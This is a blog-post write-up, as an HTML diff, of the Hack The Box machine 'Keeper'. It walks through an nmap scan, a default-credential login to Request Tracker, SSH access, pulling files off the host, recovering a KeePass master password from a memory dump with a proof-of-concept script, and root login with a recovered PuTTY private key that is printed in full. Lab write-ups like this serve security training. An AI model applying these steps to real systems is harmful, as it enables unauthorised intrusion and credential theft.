@@ -1,0 +1,438 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - Keeper (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of Keeper from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/keeper/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - Keeper (Easy)">
+<meta property="og:description" content="Writeup of Keeper from Hack The Box." />
+<meta property="og:url" content="/posts/keeper/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-08-23 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/keeper/">HTB Writeup - Keeper (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-08-23</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>Keeper</code> machine is an easy linux box.</p>
+<p><img src="/images/Keeper.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -sV -sC -A 10.10.11.227 
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-08-22 14:30 EDT
+</span></span><span style="display:flex;"><span>Stats: 0:00:00 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
+</span></span><span style="display:flex;"><span>Connect Scan Timing: About 2.45% <span style="color:#66d9ef">done</span>; ETC: 14:30 <span style="color:#f92672">(</span>0:00:40 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:00:04 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
+</span></span><span style="display:flex;"><span>Connect Scan Timing: About 33.60% <span style="color:#66d9ef">done</span>; ETC: 14:30 <span style="color:#f92672">(</span>0:00:08 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:00:22 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Service Scan
+</span></span><span style="display:flex;"><span>Service scan Timing: About 50.00% <span style="color:#66d9ef">done</span>; ETC: 14:30 <span style="color:#f92672">(</span>0:00:06 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.227
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 26.33 seconds
+</span></span></code></pre></div><p>I see the Web Page that redirect me in this link  <code>http://tickets.keeper.htb/rt/</code>, thereby I edit this file <code>/etc/hosts</code> in this way:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo nano /etc/hosts                       
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> kali: 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat /etc/hosts
+</span></span><span style="display:flex;"><span>127.0.0.1       localhost
+</span></span><span style="display:flex;"><span>127.0.1.1       kali
+</span></span><span style="display:flex;"><span>::1             localhost ip6-localhost ip6-loopback
+</span></span><span style="display:flex;"><span>ff02::1         ip6-allnodes
+</span></span><span style="display:flex;"><span>ff02::2         ip6-allrouters
+</span></span><span style="display:flex;"><span>10.10.11.227    tickets.keeper.htb
+</span></span></code></pre></div><h2 id="web-enumeration">Web Enumeration<a href="#web-enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see a Login page, and I search it in Google for <code>Default Creds</code> for Request Tracker and i discover this credentials:</p>
+<pre tabindex="0"><code>root:password
+</code></pre><p>I do a bit of enumeration in the site and I discover this directory <code>http://tickets.keeper.htb/rt/Admin/Users/Modify.html?id=27</code>, here I discover the user credentials:</p>
+<pre tabindex="0"><code>lnorgaard:Welcome2023!
+</code></pre><p>I login to ssh like lnorgaard and I find the userflag:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ ssh lnorgaard@10.10.11.227
+lnorgaard@10.10.11.227&#39;s password: 
+Permission denied, please try again.
+lnorgaard@10.10.11.227&#39;s password: 
+Permission denied, please try again.
+lnorgaard@10.10.11.227&#39;s password: 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+You have mail.
+Last login: Tue Aug 22 21:32:33 2023 from 10.10.14.112
+lnorgaard@keeper:~$ cat user.txt
+048449a30142bac10a23b899f4c5dac9
+lnorgaard@keeper:~$ 
+</code></pre><h2 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I see all files in the user directory and I unzip a file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>lnorgaard@keeper:~$ ls
+</span></span><span style="display:flex;"><span>RT30000.zip  user.txt
+</span></span><span style="display:flex;"><span>lnorgaard@keeper:~$ unzip RT30000.zip
+</span></span><span style="display:flex;"><span>Archive:  RT30000.zip
+</span></span><span style="display:flex;"><span>  inflating: KeePassDumpFull.dmp     
+</span></span><span style="display:flex;"><span> extracting: passcodes.kdbx          
+</span></span><span style="display:flex;"><span>lnorgaard@keeper:~$ ls
+</span></span><span style="display:flex;"><span>KeePassDumpFull.dmp  passcodes.kdbx  RT30000.zip  user.txt
+</span></span><span style="display:flex;"><span>lnorgaard@keeper:~$ 
+</span></span></code></pre></div><p>I download this files in my Local Machine:</p>
+<ul>
+<li>I open a WebServer  on the Target Machine:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>lnorgaard@keeper:~$ python3 -m http.server <span style="color:#ae81ff">4444</span> 
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">4444</span> <span style="color:#f92672">(</span>http://0.0.0.0:4444/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>I download the file to the Local Machine:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://keeper.htb:4444/KeePassDumpFull.dmp -O KeePassDumpFull.dmp    
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl http://keeper.htb:4444/passcodes.kdbx -O passcodes.kdbx 
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Now I use this POC to retrieve the master password of a <strong>keepass</strong> database, the repository is <code>https://github.com/CMEPW/keepass-dump-masterkey</code>, I run the python script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 poc.py -d KeePassDumpFull.dmp
+</span></span><span style="display:flex;"><span>2023-08-23 13:28:43,340 <span style="color:#f92672">[</span>.<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>main<span style="color:#f92672">]</span> Opened KeePassDumpFull.dmp
+</span></span><span style="display:flex;"><span>Possible password: ●,dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●ldgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●<span style="color:#e6db74">`</span>dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●-dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●<span style="color:#960050;background-color:#1e0010">&#39;</span>dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●<span style="color:#f92672">]</span>dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●Adgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●Idgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●:dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●<span style="color:#f92672">=</span>dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●_dgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●cdgr●d med fl●de
+</span></span><span style="display:flex;"><span>Possible password: ●Mdgr●d med fl●de
+</span></span></code></pre></div><p>I search <code>●,dgr●d med fl●de</code> on google and I find a dessert name: <code>rødgrød med fløde</code></p>
+<p>I search on google<code>How open .kdbx file on linux</code> and I find a interesting tool <code>keepassx</code>, I download this tool:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo apt install keepassx
+</span></span><span style="display:flex;"><span>Reading package lists... Done
+</span></span><span style="display:flex;"><span>Building dependency tree... Done
+</span></span><span style="display:flex;"><span>Reading state information... Done
+</span></span><span style="display:flex;"><span>The following additional packages will be installed:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ keepassxc --help
+</span></span><span style="display:flex;"><span>Usage: keepassxc <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>filename<span style="color:#f92672">(</span>s<span style="color:#f92672">)]</span>
+</span></span><span style="display:flex;"><span>KeePassXC - cross-platform password manager
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Options:
+</span></span><span style="display:flex;"><span>  -h, --help                   Displays help on commandline options.
+</span></span><span style="display:flex;"><span>  --help-all                   Displays help including Qt specific options.
+</span></span><span style="display:flex;"><span>  -v, --version                Displays version information.
+</span></span><span style="display:flex;"><span>  --config &lt;config&gt;            path to a custom config file
+</span></span><span style="display:flex;"><span>  --localconfig &lt;localconfig&gt;  path to a custom local config file
+</span></span><span style="display:flex;"><span>  --lock                       lock all open databases
+</span></span><span style="display:flex;"><span>  --keyfile &lt;keyfile&gt;          key file of the database
+</span></span><span style="display:flex;"><span>  --pw-stdin                   read password of the database from stdin
+</span></span><span style="display:flex;"><span>  --debug-info                 Displays debugging information.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Arguments:
+</span></span><span style="display:flex;"><span>  filename<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>                  filenames of the password databases to open
+</span></span><span style="display:flex;"><span>                               <span style="color:#f92672">(</span>*.kdbx<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>I open the file (the password that I used it is <code>rødgrød med fløde</code> ):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ keepassxc passcodes.kdbx
+</span></span></code></pre></div><p>I can see <code>keeper.htb (Ticketing Server)</code>, I copy that Notes in a file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nano Putty-User-Key-File.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat Putty-User-Key-File.txt
+</span></span><span style="display:flex;"><span>PuTTY-User-Key-File-3: ssh-rsa
+</span></span><span style="display:flex;"><span>Encryption: none
+</span></span><span style="display:flex;"><span>Comment: rsa-key-20230519
+</span></span><span style="display:flex;"><span>Public-Lines: <span style="color:#ae81ff">6</span>
+</span></span><span style="display:flex;"><span>AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
+</span></span><span style="display:flex;"><span>8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
+</span></span><span style="display:flex;"><span>EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
+</span></span><span style="display:flex;"><span>Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
+</span></span><span style="display:flex;"><span>FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
+</span></span><span style="display:flex;"><span>LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
+</span></span><span style="display:flex;"><span>Private-Lines: <span style="color:#ae81ff">14</span>
+</span></span><span style="display:flex;"><span>AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
+</span></span><span style="display:flex;"><span>oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
+</span></span><span style="display:flex;"><span>kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
+</span></span><span style="display:flex;"><span>f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
+</span></span><span style="display:flex;"><span>VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
+</span></span><span style="display:flex;"><span>UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
+</span></span><span style="display:flex;"><span>OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
+</span></span><span style="display:flex;"><span>in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
+</span></span><span style="display:flex;"><span>SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
+</span></span><span style="display:flex;"><span>09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
+</span></span><span style="display:flex;"><span>xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
+</span></span><span style="display:flex;"><span>AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
+</span></span><span style="display:flex;"><span>AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
+</span></span><span style="display:flex;"><span>NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
+</span></span></code></pre></div><p>I download <code>putty</code> to generate <code>id_rsa</code> with this file <code>Putty-User-Key-File.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sudo apt install putty-tools
+</span></span><span style="display:flex;"><span>Reading package lists... Done
+</span></span><span style="display:flex;"><span>Building dependency tree... Done
+</span></span><span style="display:flex;"><span>Reading state information... Done
+</span></span><span style="display:flex;"><span>Suggested packages:
+</span></span><span style="display:flex;"><span>  putty-doc
+</span></span><span style="display:flex;"><span>The following NEW packages will be installed:
+</span></span><span style="display:flex;"><span>  putty-tools
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0</span> upgraded, <span style="color:#ae81ff">1</span> newly installed, <span style="color:#ae81ff">0</span> to remove and <span style="color:#ae81ff">810</span> not upgraded.
+</span></span><span style="display:flex;"><span>Need to get <span style="color:#ae81ff">607</span> kB of archives.
+</span></span><span style="display:flex;"><span>After this operation, 3,664 kB of additional disk space will be used.
+</span></span><span style="display:flex;"><span>Get:1 http://kali.download/kali kali-rolling/main amd64 putty-tools amd64 0.78-3 <span style="color:#f92672">[</span><span style="color:#ae81ff">607</span> kB<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Fetched <span style="color:#ae81ff">607</span> kB in 1s <span style="color:#f92672">(</span><span style="color:#ae81ff">839</span> kB/s<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>Selecting previously unselected package putty-tools.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>Reading database ... <span style="color:#ae81ff">417947</span> files and directories currently installed.<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Preparing to unpack .../putty-tools_0.78-3_amd64.deb ...
+</span></span><span style="display:flex;"><span>Unpacking putty-tools <span style="color:#f92672">(</span>0.78-3<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>Setting up putty-tools <span style="color:#f92672">(</span>0.78-3<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>Processing triggers <span style="color:#66d9ef">for</span> man-db <span style="color:#f92672">(</span>2.11.2-2<span style="color:#f92672">)</span> ...
+</span></span><span style="display:flex;"><span>Processing triggers <span style="color:#66d9ef">for</span> kali-menu <span style="color:#f92672">(</span>2023.3.1<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>I generate the <code>id_rsa</code> in a specific format, and I change permissions :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$  puttygen Putty-User-Key-File.txt -O private-openssh -o id_rsa
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/keeper.htb<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ chmod <span style="color:#ae81ff">600</span> id_rsa   
+</span></span></code></pre></div><p>Now I login like root and I find the root flag:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/keeper.htb]
+└─$ ssh -i id_rsa  root@10.10.11.227
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+You have new mail.
+Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
+root@keeper:~# cat root.txt
+ae8f1cc3dc9ace2a47f9c6d94a48ff7b
+root@keeper:~# 
+</code></pre>
+      </div></div>
+
+  
+    
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/bank/">
+                <span class="button__text">HTB Writeup - Bank (Easy)</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="https://gohugo.io">CyberSpider</a></span> 
+    
+        <span>::  </span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
